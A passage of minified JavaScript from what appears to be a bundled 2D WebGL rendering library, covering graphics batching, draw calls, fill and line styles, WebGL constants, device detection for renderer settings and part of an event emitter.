dg).begin(u,c,d),this.batches.push(i),r=u),this.addUvs(this.points,t,u.texture,d,p,u.matrix))}}}var f=this.indices.length,g=this.points.length/2;if(i&&i.end(f,g),0!==this.batches.length){var m=g>65535;this.indicesUint16&&this.indices.length===this.indicesUint16.length&&m===this.indicesUint16.BYTES_PER_ELEMENT>2?this.indicesUint16.set(this.indices):this.indicesUint16=m?new Uint32Array(this.indices):new Uint16Array(this.indices),this.batchable=this.isBatchable(),this.batchable?this.packBatches():this.buildDrawCalls()}else this.batchable=!0}}else this.batchable=!0},e.prototype._compareStyles=function(t,e){return!(!t||!e)&&t.texture.baseTexture===e.texture.baseTexture&&t.color+t.alpha===e.color+e.alpha&&!!t.native==!!e.native},e.prototype.validateBatching=function(){if(this.dirty===this.cacheDirty||!this.graphicsData.length)return!1;for(var t=0,e=this.graphicsData.length;t<e;t++){var i=this.graphicsData[t],r=i.fillStyle,n=i.lineStyle;if(r&&!r.texture.baseTexture.valid)return!1;if(n&&!n.texture.baseTexture.valid)return!1}return!0},e.prototype.packBatches=function(){this.batchDirty++,this.uvsFloat32=new Float32Array(this.uvs);for(var t=this.batches,e=0,i=t.length;e<i;e++)for(var r=t[e],n=0;n<r.size;n++){var s=r.start+n;this.indicesUint16[s]=this.indicesUint16[s]-r.attribStart}},e.prototype.isBatchable=function(){if(this.points.length>131070)return!1;for(var t=this.batches,i=0;i<t.length;i++)if(t[i].style.native)return!1;return this.points.length<2*e.BATCHABLE_SIZE},e.prototype.buildDrawCalls=function(){for(var t=++$c._globalBatch,e=0;e<this.drawCalls.length;e++)this.drawCalls[e].texArray.clear(),gg.push(this.drawCalls[e]);this.drawCalls.length=0;var i=this.colors,r=this.textureIds,n=gg.pop();n||((n=new kp).texArray=new Gp),n.texArray.count=0,n.start=0,n.size=0,n.type=el.TRIANGLES;var s=0,o=null,a=0,h=!1,u=el.TRIANGLES,l=0;for(this.drawCalls.push(n),e=0;e<this.batches.length;e++){var c=this.batches[e],d=c.style,p=d.texture.baseTexture;h!==!!d.native&&(u=(h=!!d.native)?el.LINES:el.TRIANGLES,o=null,s=8,t++),o!==p&&(o=p,p._batchEnabled!==t&&(8===s&&(t++,s=0,n.size>0&&((n=gg.pop())||((n=new kp).texArray=new Gp),this.drawCalls.push(n)),n.start=l,n.size=0,n.texArray.count=0,n.type=u),p.touched=1,p._batchEnabled=t,p._batchLocation=s,p.wrapMode=al.REPEAT,n.texArray.elements[n.texArray.count++]=p,s++)),n.size+=c.size,l+=c.size,a=p._batchLocation,this.addColors(i,d.color,d.alpha,c.attribSize,c.attribStart),this.addTextureIds(r,a,c.attribSize,c.attribStart)}$c._globalBatch=t,this.packAttributes()},e.prototype.packAttributes=function(){for(var t=this.points,e=this.uvs,i=this.colors,r=this.textureIds,n=new ArrayBuffer(3*t.length*4),s=new Float32Array(n),o=new Uint32Array(n),a=0,h=0;h<t.length/2;h++)s[a++]=t[2*h],s[a++]=t[2*h+1],s[a++]=e[2*h],s[a++]=e[2*h+1],o[a++]=i[h],s[a++]=r[h];this._buffer.update(n),this._indexBuffer.update(this.indicesUint16)},e.prototype.processFill=function(t){t.holes.length?Mf.triangulate(t,this):pg[t.type].triangulate(t,this)},e.prototype.processLine=function(t){Hf(t,this);for(var e=0;e<t.holes.length;e++)Hf(t.holes[e],this)},e.prototype.processHoles=function(t){for(var e=0;e<t.length;e++){var i=t[e];pg[i.type].build(i),i.matrix&&this.transformPoints(i.points,i.matrix)}},e.prototype.calculateBounds=function(){var t=this._bounds;t.clear(),t.addVertexData(this.points,0,this.points.length),t.pad(this.boundsPadding,this.boundsPadding)},e.prototype.transformPoints=function(t,e){for(var i=0;i<t.length/2;i++){var r=t[2*i],n=t[2*i+1];t[2*i]=e.a*r+e.c*n+e.tx,t[2*i+1]=e.b*r+e.d*n+e.ty}},e.prototype.addColors=function(t,e,i,r,n){void 0===n&&(n=0);var s=jl((e>>16)+(65280&e)+((255&e)<<16),i);t.length=Math.max(t.length,n+r);for(var o=0;o<r;o++)t[n+o]=s},e.prototype.addTextureIds=function(t,e,i,r){void 0===r&&(r=0),t.length=Math.max(t.length,r+i);for(var n=0;n<i;n++)t[r+n]=e},e.prototype.addUvs=function(t,e,i,r,n,s){void 0===s&&(s=null);for(var o=0,a=e.length,h=i.frame;o<n;){var u=t[2*(r+o)],l=t[2*(r+o)+1];if(s){var c=s.a*u+s.c*l+s.tx;l=s.b*u+s.d*l+s.ty,u=c}o++,e.push(u/h.width,l/h.height)}var d=i.baseTexture;(h.width<d.width||h.height<d.height)&&this.adjustUvs(e,i,a,n)},e.prototype.adjustUvs=function(t,e,i,r){for(var n=e.baseTexture,s=1e-6,o=i+2*r,a=e.frame,h=a.width/n.width,u=a.height/n.height,l=a.x/a.width,c=a.y/a.height,d=Math.floor(t[i]+s),p=Math.floor(t[i+1]+s),f=i+2;f<o;f+=2)d=Math.min(d,Math.floor(t[f]+s)),p=Math.min(p,Math.floor(t[f+1]+s));for(l-=d,c-=p,f=i;f<o;f+=2)t[f]=(t[f]+l)*h,t[f+1]=(t[f+1]+c)*u},e.BATCHABLE_SIZE=100,e}(Xp),yg=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.width=0,e.alignment=.5,e.native=!1,e.cap=Af.BUTT,e.join=Sf.MITER,e.miterLimit=10,e}return Of(e,t),e.prototype.clone=function(){var t=new e;return t.color=this.color,t.alpha=this.alpha,t.texture=this.texture,t.matrix=this.matrix,t.visible=this.visible,t.width=this.width,t.alignment=this.alignment,t.native=this.native,t.cap=this.cap,t.join=this.join,t.miterLimit=this.miterLimit,t},e.prototype.reset=function(){t.prototype.reset.call(this),this.color=0,this.alignment=.5,this.width=0,this.native=!1},e}(Rf),xg=new Float32Array(3),Eg={},bg=function(t){function e(e){void 0===e&&(e=null);var i=t.call(this)||this;return i.shader=null,i.pluginName="batch",i.currentPath=null,i.batches=[],i.batchTint=-1,i.batchDirty=-1,i.vertexData=null,i._fillStyle=new Rf,i._lineStyle=new yg,i._matrix=null,i._holeMode=!1,i.state=ap.for2d(),i._geometry=e||new _g,i._geometry.refCount++,i._transformID=-1,i.tint=16777215,i.blendMode=tl.NORMAL,i}return Of(e,t),Object.defineProperty(e.prototype,"geometry",{get:function(){return this._geometry},enumerable:!1,configurable:!0}),e.prototype.clone=function(){return this.finishPoly(),new e(this._geometry)},Object.defineProperty(e.prototype,"blendMode",{get:function(){return this.state.blendMode},set:function(t){this.state.blendMode=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"tint",{get:function(){return this._tint},set:function(t){this._tint=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"fill",{get:function(){return this._fillStyle},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"line",{get:function(){return this._lineStyle},enumerable:!1,configurable:!0}),e.prototype.lineStyle=function(t,e,i,r,n){return void 0===t&&(t=null),void 0===e&&(e=0),void 0===i&&(i=1),void 0===r&&(r=.5),void 0===n&&(n=!1),"number"==typeof t&&(t={width:t,color:e,alpha:i,alignment:r,native:n}),this.lineTextureStyle(t)},e.prototype.lineTextureStyle=function(t){t=Object.assign({width:0,texture:ud.WHITE,color:t&&t.texture?16777215:0,alpha:1,matrix:null,alignment:.5,native:!1,cap:Af.BUTT,join:Sf.MITER,miterLimit:10},t),this.currentPath&&this.startPoly();var e=t.width>0&&t.alpha>0;return e?(t.matrix&&(t.matrix=t.matrix.clone(),t.matrix.invert()),Object.assign(this._lineStyle,{visible:e},t)):this._lineStyle.reset(),this},e.prototype.startPoly=function(){if(this.currentPath){var t=this.currentPath.points,e=this.currentPath.points.length;e>2&&(this.drawShape(this.currentPath),this.currentPath=new wc,this.currentPath.closeStroke=!1,this.currentPath.points.push(t[e-2],t[e-1]))}else this.currentPath=new wc,this.currentPath.closeStroke=!1},e.prototype.finishPoly=function(){this.currentPath&&(this.currentPath.points.length>2?(this.drawShape(this.currentPath),this.currentPath=null):this.currentPath.points.length=0)},e.prototype.moveTo=function(t,e){return this.startPoly(),this.currentPath.points[0]=t,this.currentPath.points[1]=e,this},e.prototype.lineTo=function(t,e){this.currentPath||this.moveTo(0,0);var i=this.currentPath.points,r=i[i.length-2],n=i[i.length-1];return r===t&&n===e||i.push(t,e),this},e.prototype._initCurve=function(t,e){void 0===t&&(t=0),void 0===e&&(e=0),this.currentPath?0===this.currentPath.points.length&&(this.currentPath.points=[t,e]):this.moveTo(t,e)},e.prototype.quadraticCurveTo=function(t,e,i,r){this._initCurve();var n=this.currentPath.points;return 0===n.length&&this.moveTo(0,0),cg.curveTo(t,e,i,r,n),this},e.prototype.bezierCurveTo=function(t,e,i,r,n,s){return this._initCurve(),lg.curveTo(t,e,i,r,n,s,this.currentPath.points),this},e.prototype.arcTo=function(t,e,i,r,n){this._initCurve(t,e);var s=this.currentPath.points,o=ug.curveTo(t,e,i,r,n,s);if(o){var a=o.cx,h=o.cy,u=o.radius,l=o.startAngle,c=o.endAngle,d=o.anticlockwise;this.arc(a,h,u,l,c,d)}return this},e.prototype.arc=function(t,e,i,r,n,s){if(void 0===s&&(s=!1),r===n)return this;if(!s&&n<=r?n+=vc:s&&r<=n&&(r+=vc),0==n-r)return this;var o=t+Math.cos(r)*i,a=e+Math.sin(r)*i,h=this._geometry.closePointEps,u=this.currentPath?this.currentPath.points:null;if(u){var l=Math.abs(u[u.length-2]-o),c=Math.abs(u[u.length-1]-a);l<h&&c<h||u.push(o,a)}else this.moveTo(o,a),u=this.currentPath.points;return ug.arc(o,a,t,e,i,r,n,s,u),this},e.prototype.beginFill=function(t,e){return void 0===t&&(t=0),void 0===e&&(e=1),this.beginTextureFill({texture:ud.WHITE,color:t,alpha:e})},e.prototype.beginTextureFill=function(t){t=Object.assign({texture:ud.WHITE,color:16777215,alpha:1,matrix:null},t),this.currentPath&&this.startPoly();var e=t.alpha>0;return e?(t.matrix&&(t.matrix=t.matrix.clone(),t.matrix.invert()),Object.assign(this._fillStyle,{visible:e},t)):this._fillStyle.reset(),this},e.prototype.endFill=function(){return this.finishPoly(),this._fillStyle.reset(),this},e.prototype.drawRect=function(t,e,i,r){return this.drawShape(new bc(t,e,i,r))},e.prototype.drawRoundedRect=function(t,e,i,r,n){return this.drawShape(new Sc(t,e,i,r,n))},e.prototype.drawCircle=function(t,e,i){return this.drawShape(new Tc(t,e,i))},e.prototype.drawEllipse=function(t,e,i,r){return this.drawShape(new Dc(t,e,i,r))},e.prototype.drawPolygon=function(){for(var t,e=arguments,i=[],r=0;r<arguments.length;r++)i[r]=e[r];var n=!0,s=i[0];s.points?(n=s.closeStroke,t=s.points):t=Array.isArray(i[0])?i[0]:i;var o=new wc(t);return o.closeStroke=n,this.drawShape(o),this},e.prototype.drawShape=function(t){return this._holeMode?this._geometry.drawHole(t,this._matrix):this._geometry.drawShape(t,this._fillStyle.clone(),this._lineStyle.clone(),this._matrix),this},e.prototype.clear=function(){return this._geometry.clear(),this._lineStyle.reset(),this._fillStyle.reset(),this._boundsID++,this._matrix=null,this._holeMode=!1,this.currentPath=null,this},e.prototype.isFastRect=function(){var t=this._geometry.graphicsData;return!(1!==t.length||t[0].shape.type!==pc.RECT||t[0].matrix||t[0].holes.length||t[0].lineStyle.visible&&t[0].lineStyle.width)},e.prototype._render=function(t){this.finishPoly();var e=this._geometry;e.updateBatches(),e.batchable?(this.batchDirty!==e.batchDirty&&this._populateBatches(),this._renderBatched(t)):(t.batch.flush(),this._renderDirect(t))},e.prototype._populateBatches=function(){var t=this._geometry,e=this.blendMode,i=t.batches.length;this.batchTint=-1,this._transformID=-1,this.batchDirty=t.batchDirty,this.batches.length=i,this.vertexData=new Float32Array(t.points);for(var r=0;r<i;r++){var n=t.batches[r],s=n.style.color,o=new Float32Array(this.vertexData.buffer,4*n.attribStart*2,2*n.attribSize),a=new Float32Array(t.uvsFloat32.buffer,4*n.attribStart*2,2*n.attribSize),h={vertexData:o,blendMode:e,indices:new Uint16Array(t.indicesUint16.buffer,2*n.start,n.size),uvs:a,_batchRGB:zl(s),_tintRGB:s,_texture:n.style.texture,alpha:n.style.alpha,worldAlpha:1};this.batches[r]=h}},e.prototype._renderBatched=function(t){if(this.batches.length){t.batch.setObjectRenderer(t.plugins[this.pluginName]),this.calculateVertices(),this.calculateTints();for(var e=0,i=this.batches.length;e<i;e++){var r=this.batches[e];r.worldAlpha=this.worldAlpha*r.alpha,t.plugins[this.pluginName].render(r)}}},e.prototype._renderDirect=function(t){var e=this._resolveDirectShader(t),i=this._geometry,r=this.tint,n=this.worldAlpha,s=e.uniforms,o=i.drawCalls;s.translationMatrix=this.transform.worldTransform,s.tint[0]=(r>>16&255)/255*n,s.tint[1]=(r>>8&255)/255*n,s.tint[2]=(255&r)/255*n,s.tint[3]=n,t.shader.bind(e),t.geometry.bind(i,e),t.state.set(this.state);for(var a=0,h=o.length;a<h;a++)this._renderDrawCallDirect(t,i.drawCalls[a])},e.prototype._renderDrawCallDirect=function(t,e){for(var i=e.texArray,r=e.type,n=e.size,s=e.start,o=i.count,a=0;a<o;a++)t.texture.bind(i.elements[a],a);t.geometry.draw(r,n,s)},e.prototype._resolveDirectShader=function(t){var e=this.shader,i=this.pluginName;if(!e){if(!Eg[i]){for(var r=t.plugins[i].MAX_TEXTURES,n=new Int32Array(r),s=0;s<r;s++)n[s]=s;var o={tint:new Float32Array([1,1,1,1]),translationMatrix:new Cc,default:Td.from({uSamplers:n},!0)},a=t.plugins[i]._shader.program;Eg[i]=new op(a,o)}e=Eg[i]}return e},e.prototype._calculateBounds=function(){this.finishPoly();var t=this._geometry;if(t.graphicsData.length){var e=t.bounds,i=e.minX,r=e.minY,n=e.maxX,s=e.maxY;this._bounds.addFrame(this.transform,i,r,n,s)}},e.prototype.containsPoint=function(t){return this.worldTransform.applyInverse(t,e._TEMP_POINT),this._geometry.containsPoint(e._TEMP_POINT)},e.prototype.calculateTints=function(){if(this.batchTint!==this.tint){this.batchTint=this.tint;for(var t=zl(this.tint,xg),e=0;e<this.batches.length;e++){var i=this.batches[e],r=i._batchRGB,n=(t[0]*r[0]*255<<16)+(t[1]*r[1]*255<<8)+(0|t[2]*r[2]*255);i._tintRGB=(n>>16)+(65280&n)+((255&n)<<16)}}},e.prototype.calculateVertices=function(){var t=this.transform._worldID;if(this._transformID!==t){this._transformID=t;for(var e=this.transform.worldTransform,i=e.a,r=e.b,n=e.c,s=e.d,o=e.tx,a=e.ty,h=this._geometry.points,u=this.vertexData,l=0,c=0;c<h.length;c+=2){var d=h[c],p=h[c+1];u[l++]=i*d+n*p+o,u[l++]=s*p+r*d+a}}},e.prototype.closePath=function(){var t=this.currentPath;return t&&(t.closeStroke=!0,this.finishPoly()),this},e.prototype.setMatrix=function(t){return this._matrix=t,this},e.prototype.beginHole=function(){return this.finishPoly(),this._holeMode=!0,this},e.prototype.endHole=function(){return this.finishPoly(),this._holeMode=!1,this},e.prototype.destroy=function(e){this._geometry.refCount--,0===this._geometry.refCount&&this._geometry.dispose(),this._matrix=null,this.currentPath=null,this._lineStyle.destroy(),this._lineStyle=null,this._fillStyle.destroy(),this._fillStyle=null,this._geometry=null,this.shader=null,this.vertexData=null,this.batches.length=0,this.batches=null,t.prototype.destroy.call(this,e)},e.nextRoundedRectBehavior=!1,e._TEMP_POINT=new xc,e}(Cf),Tg=function(){function t(){}return t.init=function(t){var e=this;Object.defineProperty(this,"resizeTo",{set:function(t){globalThis.removeEventListener("resize",this.queueResize),this._resizeTo=t,t&&(globalThis.addEventListener("resize",this.queueResize),this.resize())},get:function(){return this._resizeTo}}),this.queueResize=function(){e._resizeTo&&(e.cancelResize(),e._resizeId=requestAnimationFrame((function(){return e.resize()})))},this.cancelResize=function(){e._resizeId&&(cancelAnimationFrame(e._resizeId),e._resizeId=null)},this.resize=function(){if(e._resizeTo){var t,i;if(e.cancelResize(),e._resizeTo===globalThis.window)t=globalThis.innerWidth,i=globalThis.innerHeight;else{var r=e._resizeTo;t=r.clientWidth,i=r.clientHeight}e.renderer.resize(t,i)}},this._resizeId=null,this._resizeTo=null,this.resizeTo=t.resizeTo||null},t.destroy=function(){globalThis.removeEventListener("resize",this.queueResize),this.cancelResize(),this.cancelResize=null,this.queueResize=null,this.resizeTo=null,this.resize=null},t.extension=ac.Application,t}();!function(t){t[t.WEBGL_LEGACY=0]="WEBGL_LEGACY",t[t.WEBGL=1]="WEBGL",t[t.WEBGL2=2]="WEBGL2"}(Vf||(Vf={})),function(t){t[t.UNKNOWN=0]="UNKNOWN",t[t.WEBGL=1]="WEBGL",t[t.CANVAS=2]="CANVAS"}(Xf||(Xf={})),function(t){t[t.COLOR=16384]="COLOR",t[t.DEPTH=256]="DEPTH",t[t.STENCIL=1024]="STENCIL"}(jf||(jf={})),function(t){t[t.NORMAL=0]="NORMAL",t[t.ADD=1]="ADD",t[t.MULTIPLY=2]="MULTIPLY",t[t.SCREEN=3]="SCREEN",t[t.OVERLAY=4]="OVERLAY",t[t.DARKEN=5]="DARKEN",t[t.LIGHTEN=6]="LIGHTEN",t[t.COLOR_DODGE=7]="COLOR_DODGE",t[t.COLOR_BURN=8]="COLOR_BURN",t[t.HARD_LIGHT=9]="HARD_LIGHT",t[t.SOFT_LIGHT=10]="SOFT_LIGHT",t[t.DIFFERENCE=11]="DIFFERENCE",t[t.EXCLUSION=12]="EXCLUSION",t[t.HUE=13]="HUE",t[t.SATURATION=14]="SATURATION",t[t.COLOR=15]="COLOR",t[t.LUMINOSITY=16]="LUMINOSITY",t[t.NORMAL_NPM=17]="NORMAL_NPM",t[t.ADD_NPM=18]="ADD_NPM",t[t.SCREEN_NPM=19]="SCREEN_NPM",t[t.NONE=20]="NONE",t[t.SRC_OVER=0]="SRC_OVER",t[t.SRC_IN=21]="SRC_IN",t[t.SRC_OUT=22]="SRC_OUT",t[t.SRC_ATOP=23]="SRC_ATOP",t[t.DST_OVER=24]="DST_OVER",t[t.DST_IN=25]="DST_IN",t[t.DST_OUT=26]="DST_OUT",t[t.DST_ATOP=27]="DST_ATOP",t[t.ERASE=26]="ERASE",t[t.SUBTRACT=28]="SUBTRACT",t[t.XOR=29]="XOR"}($f||($f={})),function(t){t[t.POINTS=0]="POINTS",t[t.LINES=1]="LINES",t[t.LINE_LOOP=2]="LINE_LOOP",t[t.LINE_STRIP=3]="LINE_STRIP",t[t.TRIANGLES=4]="TRIANGLES",t[t.TRIANGLE_STRIP=5]="TRIANGLE_STRIP",t[t.TRIANGLE_FAN=6]="TRIANGLE_FAN"}(Wf||(Wf={})),function(t){t[t.RGBA=6408]="RGBA",t[t.RGB=6407]="RGB",t[t.RG=33319]="RG",t[t.RED=6403]="RED",t[t.RGBA_INTEGER=36249]="RGBA_INTEGER",t[t.RGB_INTEGER=36248]="RGB_INTEGER",t[t.RG_INTEGER=33320]="RG_INTEGER",t[t.RED_INTEGER=36244]="RED_INTEGER",t[t.ALPHA=6406]="ALPHA",t[t.LUMINANCE=6409]="LUMINANCE",t[t.LUMINANCE_ALPHA=6410]="LUMINANCE_ALPHA",t[t.DEPTH_COMPONENT=6402]="DEPTH_COMPONENT",t[t.DEPTH_STENCIL=34041]="DEPTH_STENCIL"}(Yf||(Yf={})),function(t){t[t.TEXTURE_2D=3553]="TEXTURE_2D",t[t.TEXTURE_CUBE_MAP=34067]="TEXTURE_CUBE_MAP",t[t.TEXTURE_2D_ARRAY=35866]="TEXTURE_2D_ARRAY",t[t.TEXTURE_CUBE_MAP_POSITIVE_X=34069]="TEXTURE_CUBE_MAP_POSITIVE_X",t[t.TEXTURE_CUBE_MAP_NEGATIVE_X=34070]="TEXTURE_CUBE_MAP_NEGATIVE_X",t[t.TEXTURE_CUBE_MAP_POSITIVE_Y=34071]="TEXTURE_CUBE_MAP_POSITIVE_Y",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Y=34072]="TEXTURE_CUBE_MAP_NEGATIVE_Y",t[t.TEXTURE_CUBE_MAP_POSITIVE_Z=34073]="TEXTURE_CUBE_MAP_POSITIVE_Z",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Z=34074]="TEXTURE_CUBE_MAP_NEGATIVE_Z"}(qf||(qf={})),function(t){t[t.UNSIGNED_BYTE=5121]="UNSIGNED_BYTE",t[t.UNSIGNED_SHORT=5123]="UNSIGNED_SHORT",t[t.UNSIGNED_SHORT_5_6_5=33635]="UNSIGNED_SHORT_5_6_5",t[t.UNSIGNED_SHORT_4_4_4_4=32819]="UNSIGNED_SHORT_4_4_4_4",t[t.UNSIGNED_SHORT_5_5_5_1=32820]="UNSIGNED_SHORT_5_5_5_1",t[t.UNSIGNED_INT=5125]="UNSIGNED_INT",t[t.UNSIGNED_INT_10F_11F_11F_REV=35899]="UNSIGNED_INT_10F_11F_11F_REV",t[t.UNSIGNED_INT_2_10_10_10_REV=33640]="UNSIGNED_INT_2_10_10_10_REV",t[t.UNSIGNED_INT_24_8=34042]="UNSIGNED_INT_24_8",t[t.UNSIGNED_INT_5_9_9_9_REV=35902]="UNSIGNED_INT_5_9_9_9_REV",t[t.BYTE=5120]="BYTE",t[t.SHORT=5122]="SHORT",t[t.INT=5124]="INT",t[t.FLOAT=5126]="FLOAT",t[t.FLOAT_32_UNSIGNED_INT_24_8_REV=36269]="FLOAT_32_UNSIGNED_INT_24_8_REV",t[t.HALF_FLOAT=36193]="HALF_FLOAT"}(Zf||(Zf={})),function(t){t[t.FLOAT=0]="FLOAT",t[t.INT=1]="INT",t[t.UINT=2]="UINT"}(Kf||(Kf={})),function(t){t[t.NEAREST=0]="NEAREST",t[t.LINEAR=1]="LINEAR"}(Qf||(Qf={})),function(t){t[t.CLAMP=33071]="CLAMP",t[t.REPEAT=10497]="REPEAT",t[t.MIRRORED_REPEAT=33648]="MIRRORED_REPEAT"}(Jf||(Jf={})),function(t){t[t.OFF=0]="OFF",t[t.POW2=1]="POW2",t[t.ON=2]="ON",t[t.ON_MANUAL=3]="ON_MANUAL"}(tg||(tg={})),function(t){t[t.NPM=0]="NPM",t[t.UNPACK=1]="UNPACK",t[t.PMA=2]="PMA",t[t.NO_PREMULTIPLIED_ALPHA=0]="NO_PREMULTIPLIED_ALPHA",t[t.PREMULTIPLY_ON_UPLOAD=1]="PREMULTIPLY_ON_UPLOAD",t[t.PREMULTIPLY_ALPHA=2]="PREMULTIPLY_ALPHA",t[t.PREMULTIPLIED_ALPHA=2]="PREMULTIPLIED_ALPHA"}(eg||(eg={})),function(t){t[t.NO=0]="NO",t[t.YES=1]="YES",t[t.AUTO=2]="AUTO",t[t.BLEND=0]="BLEND",t[t.CLEAR=1]="CLEAR",t[t.BLIT=2]="BLIT"}(ig||(ig={})),function(t){t[t.AUTO=0]="AUTO",t[t.MANUAL=1]="MANUAL"}(rg||(rg={})),function(t){t.LOW="lowp",t.MEDIUM="mediump",t.HIGH="highp"}(ng||(ng={})),function(t){t[t.NONE=0]="NONE",t[t.SCISSOR=1]="SCISSOR",t[t.STENCIL=2]="STENCIL",t[t.SPRITE=3]="SPRITE",t[t.COLOR=4]="COLOR"}(sg||(sg={})),function(t){t[t.RED=1]="RED",t[t.GREEN=2]="GREEN",t[t.BLUE=4]="BLUE",t[t.ALPHA=8]="ALPHA"}(og||(og={})),function(t){t[t.NONE=0]="NONE",t[t.LOW=2]="LOW",t[t.MEDIUM=4]="MEDIUM",t[t.HIGH=8]="HIGH"}(ag||(ag={})),function(t){t[t.ELEMENT_ARRAY_BUFFER=34963]="ELEMENT_ARRAY_BUFFER",t[t.ARRAY_BUFFER=34962]="ARRAY_BUFFER",t[t.UNIFORM_BUFFER=35345]="UNIFORM_BUFFER"}(hg||(hg={}));var Dg={createCanvas:function(t,e){var i=document.createElement("canvas");return i.width=t,i.height=e,i},getWebGLRenderingContext:function(){return WebGLRenderingContext},getNavigator:function(){return navigator},getBaseUrl:function(){var t;return null!==(t=document.baseURI)&&void 0!==t?t:window.location.href},fetch:function(t,e){return fetch(t,e)}},wg=/iPhone/i,Sg=/iPod/i,Ag=/iPad/i,Cg=/\biOS-universal(?:.+)Mac\b/i,Ig=/\bAndroid(?:.+)Mobile\b/i,Rg=/Android/i,Pg=/(?:SD4930UR|\bSilk(?:.+)Mobile\b)/i,Og=/Silk/i,Ng=/Windows Phone/i,Mg=/\bWindows(?:.+)ARM\b/i,Fg=/BlackBerry/i,Lg=/BB10/i,Bg=/Opera Mini/i,Ug=/\b(CriOS|Chrome)(?:.+)Mobile/i,kg=/Mobile(?:.+)Firefox\b/i,Gg=function(t){return void 0!==t&&"MacIntel"===t.platform&&"number"==typeof t.maxTouchPoints&&t.maxTouchPoints>1&&"undefined"==typeof MSStream},Hg=function(t){var e={userAgent:"",platform:"",maxTouchPoints:0};t||"undefined"==typeof navigator?"string"==typeof t?e.userAgent=t:t&&t.userAgent&&(e={userAgent:t.userAgent,platform:t.platform,maxTouchPoints:t.maxTouchPoints||0}):e={userAgent:navigator.userAgent,platform:navigator.platform,maxTouchPoints:navigator.maxTouchPoints||0};var i=e.userAgent,r=i.split("[FBAN");void 0!==r[1]&&(i=r[0]),void 0!==(r=i.split("Twitter"))[1]&&(i=r[0]);var n=function(t){return function(e){return e.test(t)}}(i),s={apple:{phone:n(wg)&&!n(Ng),ipod:n(Sg),tablet:!n(wg)&&(n(Ag)||Gg(e))&&!n(Ng),universal:n(Cg),device:(n(wg)||n(Sg)||n(Ag)||n(Cg)||Gg(e))&&!n(Ng)},amazon:{phone:n(Pg),tablet:!n(Pg)&&n(Og),device:n(Pg)||n(Og)},android:{phone:!n(Ng)&&n(Pg)||!n(Ng)&&n(Ig),tablet:!n(Ng)&&!n(Pg)&&!n(Ig)&&(n(Og)||n(Rg)),device:!n(Ng)&&(n(Pg)||n(Og)||n(Ig)||n(Rg))||n(/\bokhttp\b/i)},windows:{phone:n(Ng),tablet:n(Mg),device:n(Ng)||n(Mg)},other:{blackberry:n(Fg),blackberry10:n(Lg),opera:n(Bg),firefox:n(kg),chrome:n(Ug),device:n(Fg)||n(Lg)||n(Bg)||n(kg)||n(Ug)},any:!1,phone:!1,tablet:!1};return s.any=s.apple.device||s.android.device||s.windows.device||s.other.device,s.phone=s.apple.phone||s.android.phone||s.windows.phone,s.tablet=s.apple.tablet||s.android.tablet||s.windows.tablet,s}(globalThis.navigator),zg={ADAPTER:Dg,MIPMAP_TEXTURES:tg.POW2,ANISOTROPIC_LEVEL:0,RESOLUTION:1,FILTER_RESOLUTION:1,FILTER_MULTISAMPLE:ag.NONE,SPRITE_MAX_TEXTURES:function(t){var e,i=!0;return(Hg.tablet||Hg.phone)&&(Hg.apple.device&&(e=navigator.userAgent.match(/OS (\d+)_(\d+)?/))&&parseInt(e[1],10)<11&&(i=!1),Hg.android.device&&(e=navigator.userAgent.match(/Android\s([0-9.]*)/))&&parseInt(e[1],10)<7&&(i=!1)),i?32:4}(),SPRITE_BATCH_SIZE:4096,RENDER_OPTIONS:{view:null,antialias:!1,autoDensity:!1,backgroundColor:0,backgroundAlpha:1,useContextAlpha:!0,clearBeforeRender:!0,preserveDrawingBuffer:!1,width:800,height:600,legacy:!1},GC_MODE:rg.AUTO,GC_MAX_IDLE:3600,GC_MAX_CHECK_COUNT:600,WRAP_MODE:Jf.CLAMP,SCALE_MODE:Qf.LINEAR,PRECISION_VERTEX:ng.HIGH,PRECISION_FRAGMENT:Hg.apple.device?ng.HIGH:ng.MEDIUM,CAN_UPLOAD_SAME_BUFFER:!Hg.apple.device,CREATE_IMAGE_BITMAP:!1,ROUND_PIXELS:!1},Vg="undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:{};function Xg(t,e,i){return t(i={path:e,exports:{},require:function(t,e){return function(){throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs")}(null==e&&i.path)}},i.exports),i.exports}function jg(t,e){return Object.prototype.hasOwnProperty.call(t,e)}Xg((function(t){var e=Object.prototype.hasOwnProperty,i="~";function r(){}function n(t,e,i){this.fn=t,this.context=e,this.once=i||!1}function s(t,e,r,s,o){if("function"!=typeof r)throw new TypeError("The listener must be a function");var a=new n(r,s||t,o),h=i?i+e:e;return t._events[h]?t._events[h].fn?t._events[h]=[t._events[h],a]:t._events[h].push(a):(t._events[h]=a,t._eventsCount++),t}function o(t,e){0==--t._eventsCount?t._events=new r:delete t._events[e]}function a(){this._events=new r,this._eventsCount=0}Object.create&&(r.prototype=Object.create(null),(new r).__proto__||(i=!1)),a.prototype.eventNames=function(){var t,r,n=[];if(0===this._eventsCount)return n;for(r in t=this._events)e.call(t,r)&&n.push(i?r.slice(1):r);return Object.getOwnPropertySymbols?n.concat(Object.getOwnPropertySymbols(t)):n},a.prototype.listeners=function(t){var e=i?i+t:t,r=this._events[e];if(!r)return[];if(r.fn)return[r.fn];for(var n=0,s=r.length,o=new Array(s);n<s;n++)o[n]=r[n].fn;return o},a.prototype.listenerCount=function(t){var e=i?i+t:t,r=this._events[e];return r?r.fn?1:r.length:0},a.prototype.emit=function(t,e,r,n,s,o){var a=arguments,h=i?i+t:t;if(!this._events[h])return!1;var u,l,c=this._events[h],d=arguments.length;if(c.fn){switch(c.once&&this.removeListener(t,c.fn,void 0,!0),d){case 1:return c.fn.call(c.context),!0;case 2:return c.fn.call(c.context,e),!0;case 3:return c.fn.call(c.context,e,r),!0;case 4:return c.fn.call(c.context,e,r,n),!0;case 5:return c.fn.call(c.context,e,r,n,s),!0;case 6:return c.fn.call(c.context,e,r,n,s,o),!0}for(l=1,u=new Array(d-1);l<d;l++)u[l-1]=a[l];c.fn.apply(c.context,u)}else{var p,f=c.length;for(l=0;l<f;l++)switch(c[l].once&&this.removeListener(t,c[l].fn,void 0,!0),d){case 1:c[l].fn.call(c[l].context);break;case 